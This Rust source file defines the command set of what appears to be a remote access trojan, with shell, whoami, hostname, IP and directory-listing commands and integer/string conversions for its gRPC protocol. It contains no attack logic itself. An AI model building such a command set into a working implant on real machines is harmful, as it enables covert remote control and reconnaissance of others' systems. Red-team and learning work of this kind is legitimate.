pub mod rat {
    tonic::include_proto!("rat");
}

// Hacky copy of the protobuf in rat.rs
pub enum RsRatCommand {
    Cadence = 0,
    Dir = 1,
    Hostname = 2,
    Ip = 3,
    Ls = 4,
    None = 5,
    Os = 6,
    Quit = 7,
    Shell = 8,
    Whoami = 9,
}

// Way to convert the hacky copy of the protobuf to a string slice
impl From<RsRatCommand> for &str {
    fn from(rat_command: RsRatCommand) -> Self {
        match rat_command {
            RsRatCommand::Cadence => "cadence",
            RsRatCommand::Dir => "dir",
            RsRatCommand::Hostname => "hostname",
            RsRatCommand::Ip => "ip",
            RsRatCommand::Ls => "ls",
            RsRatCommand::None => "none",
            RsRatCommand::Os => "os",
            RsRatCommand::Quit => "quit",
            RsRatCommand::Shell => "shell",
            RsRatCommand::Whoami => "whoami",
        }
    }
}

// Way to convert from an i32 into the hacky copy of the protobuf
impl From<i32> for RsRatCommand {
    fn from(number: i32) -> Self {
        match number {
            0 => RsRatCommand::Cadence,
            1 => RsRatCommand::Dir,
            2 => RsRatCommand::Hostname,
            3 => RsRatCommand::Ip,
            4 => RsRatCommand::Ls,
            6 => RsRatCommand::Os,
            7 => RsRatCommand::Quit,
            8 => RsRatCommand::Shell,
            9 => RsRatCommand::Whoami,
            _ => RsRatCommand::None
        }
    }
}